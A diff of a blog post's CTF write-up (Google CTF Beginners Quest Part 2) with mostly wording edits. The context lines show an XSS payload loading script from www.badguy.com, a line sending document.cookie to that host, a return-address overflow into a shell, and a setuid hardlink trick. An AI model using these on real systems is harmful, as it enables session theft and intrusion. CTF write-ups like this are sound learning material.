@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-07-31 18:49:05 +0000
-last_modified_at: 2018-08-01 07:01:30 +0000
+last_modified_at: 2018-08-01 08:56:09 +0000
 title: "Google CTF: Beginners Quest (Part 2)"
 category: CTF
 tags: [Google]
@@ -71,7 +71,7 @@ And use that to determine the offset where we can control the return address.
 
 ![pattern](/assets/images/posts/google-ctf-beginners-quest-part-2/72e99c50.png)
 
-We need to `continue` the execution flow until we exit the `command_line` function with the `quit` command. We'll hit a segmentation fault because the return address is non-existent. We can then use the `pattern_offset` command to determine the offset.
+We need to `continue` the execution flow in `gdb` until we exit the `command_line` function with the `quit` command. We'll hit a segmentation fault because the return address is non-existent. We can then use the `pattern_offset` command to determine the offset.
 
 ![offset](/assets/images/posts/google-ctf-beginners-quest-part-2/84db8cb2.png)
 
@@ -85,7 +85,7 @@ There's an interesting function `debug_shell` that wraps around the `system` lib
 
 Awesome. The offset controls the return address, which in turn allows us to return to `debug_shell` at `0x41414227` to execute `/bin/sh`. Sounds like a plan.
 
-For the exploit to work, we supply printable ASCII characters onto the limited shell—the return address `0x41414227` is `'BAA` in little-endian ASCII.
+For the exploit to work, we have to supply printable ASCII characters onto the limited shell—the return address `0x41414227` is `'BAA` in little-endian ASCII.
 
 ![shell](/assets/images/posts/google-ctf-beginners-quest-part-2/09550697.png)
 
@@ -109,7 +109,7 @@ Anyhow, let's go with (`admin:password`) and see what happens.
 
 ![admin:password](/assets/images/posts/google-ctf-beginners-quest-part-2/591c4eee.png)
 
-Hmmm. Wrong credentials but interesting output. Notice that a double slash ("//") separates the username and password? Where do we see double slash ("//")? If you shout out "URL", you are right!
+Hmmm. Wrong credentials but interesting output. Notice that a double slash ("//") separates the username and password? When was the last time you see a double slash ("//")? If the answer is "URL", you are right!
 
 ![RFC3986](/assets/images/posts/google-ctf-beginners-quest-part-2/c1309d25.png)
 
@@ -117,7 +117,9 @@ This is what RFC 3986: Uniform Resource Identifier (URI) has to [say](https://to
 
 Guess what happens when we put `<script src="https:` into the username value and `www.badguy.com/bad.js"></script>` into the password value?
 
-`Wrong credentials: <script src="https:`**`//`**`www.badguy.com/bad.js"></script>`
+```
+Wrong credentials: <script src="https://www.badguy.com/bad.js"></script>
+```
 
 The page at `https://router-ui.web.ctfcompetition.com` responds with the wrong credentials notification, and a `<script>` tag that loads bad JS from the `www.badguy.com` domain.
 
@@ -127,9 +129,9 @@ The file `bad.js` can be simple as this to steal the session cookies registered 
 document.location = 'http://www.badguy.com/flag.png?' + document.cookie;
 ```
 
-Next up, we have to figure out what link to send to Wintermuted such that clicking the link has the same effect as POSTing the username and password as seen above to `https://router-ui.web.ctfcompetition.com/login` and triggering the bad JS, without any user interaction.
+Next up, we have to figure out the link to send to Wintermuted such that clicking the link has the same effect as POSTing the username and password as seen above to `https://router-ui.web.ctfcompetition.com/login` and triggering the bad JS, without any user interaction.
 
-The link would be `https://www.badguy.com/index.html` and this is how it looks like.
+This is how it looks like.
 
 ```html
 <html>
@@ -299,7 +301,7 @@ The next clue comes after much persuasive coaxing by a well-known character in S
 
 ![sqlite3.OperationalError](/assets/images/posts/google-ctf-beginners-quest-part-2/d001d38c.png)
 
-Media-DB is running on Python and SQLite. But, how to proceed knowing these two information? As you can see from above, the mechanism behind **Option 4) shuffle artist** is to display column `artist` and `song` from the table `media` after you have added a song through **Option 1) add song**.
+Media-DB is running on Python and SQLite. But, how do we proceed knowing this information? As you can see from above, the mechanism behind **Option 4) shuffle artist** is to display column `artist` and `song` from the table `media` after you have added a song through **Option 1) add song**.
 
 ![Look Ma No Hands](/assets/images/posts/google-ctf-beginners-quest-part-2/4153bcb0.png)
 
@@ -367,7 +369,7 @@ First, let's create a 300-byte pattern. This is how the pattern looks like.
 
 ![buf](/assets/images/posts/google-ctf-beginners-quest-part-2/9fd3f1a1.png)
 
-After we supply the pattern as input to `gets`, let the program `continue`. We'll encounter a segmentation fault.
+After we supply the pattern as input to `gets`, let the program `continue` in `gdb`. We'll soon encounter a segmentation fault.
 
 ![segfault](/assets/images/posts/google-ctf-beginners-quest-part-2/1b5a729a.png)
 
@@ -501,7 +503,7 @@ Create a hardlink to `/home/poetry/poetry`. Let's call it `x` for exploit.
 
 ![hardlink](/assets/images/posts/google-ctf-beginners-quest-part-2/959dc85c.png)
 
-Hardlink is a link to the same file, same inode number (5). You can see that `x` is also `setuid` to `poetry`. Hardlink is not enabled by default for security reason (at least on my GNU/Linux distribution), which you'll see later. You can temporarily enable it by setting:
+Hardlink is a link to the same file with the same inode number (5). You can see that `x` is also `setuid` to `poetry`. Hardlink is not enabled by default for security reason (at least on my GNU/Linux distribution), which you'll see why later. You can temporarily enable it by setting:
 
 ```
 # echo 0 > /proc/sys/fs/protected_hardlinks
@@ -678,7 +680,7 @@ Here's what we see when we look at the memory address of the sections in the pro
 
 The `.got.plt` section is the global offset table (GOT) for the procedure linkage table (PLT) where it contains the resolved target addresses or unresolved addresses from the PLT, waiting to trigger the target address resolution routine when called.
 
-Look how close `todos` (`0x555555559140`) is to the `.got.plt` section (`0x555555559000`) in the memory?
+Look how close `todos` (`0x555555559140`) is to the `.got.plt` section (`0x555555559000`) in the memory.
 
 The `.got.plt` section is a common target for exploitation because you can change a function to some other executable code you control. Let's look at the available PLT functions.
 
